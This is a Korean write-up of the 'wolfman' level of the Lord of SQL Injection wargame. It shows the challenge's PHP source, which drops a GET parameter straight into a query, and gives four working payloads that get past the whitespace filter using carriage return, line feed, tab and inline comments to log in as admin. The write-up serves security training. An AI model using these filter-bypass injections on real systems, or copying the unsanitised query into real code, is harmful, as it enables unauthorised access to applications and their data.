# Lord of SQL Injection No.5 - wolfman

## 문제 출제 의도

공백문자(' ')를 사용하지 않고 원하는 문자열을 SELECT 하도록 SQL을 조작할 수 있는지 확인한다.

## 소스 코드 분석

wolfman 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, pw에 `공백문자(' ')` 가 들어 있으면 `No whitespace ~_~`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "admin"이라는 값이 들어있음'이다.

-----

## Solution
    
1. CR(Carriage Return) 이용

    ASCII Code 표를 살펴보면 16진수로 0x0D는 Carriage Return에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

    ```
    http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw='%0Dor%0Did='admin'--%0D-
    ```
    ```sql
    select id from prob_wolfman where id='guest' and pw='' or id='admin'-- -'
    ```

    이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

2. LF(Line Feed)

    ASCII Code 표를 살펴보면 16진수로 0x0A는 Line Feed에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

    ```
    http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw='%0Aor%0Aid='admin'%23
    ```
    ```sql
    select id from prob_wolfman where id='guest' and pw='' or id='admin'#'
    ```

    주석으로 `#`을 쓴 이유는 `-- -`을 사용할 때 가운데 공백으로 %0A를 사용하면 정상적으로 작동하지 않기 때문이다.

    이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

3. Tab

    ASCII Code 표를 살펴보면 16진수로 0x09는 Tab에 해당한다.

    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

    ```
    http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw='%09or%09id='admin'--%09-
    ```
    ```sql
    select id from prob_wolfman where id='guest' and pw=''	or	id='admin'--	-'
    ```

    이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

4. 주석

    MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.

    ```
    http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw='/**/or/**/id='admin'%23
    ```
    ```sql
    select id from prob_wolfman where id='guest' and pw=''/**/or/**/id='admin'#'
    ```

    주석으로 `#`을 쓴 이유는 `-- -`을 사용할 때 가운데 공백으로 주석을 사용하면 정상적으로 작동하지 않기 때문이다.

    이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.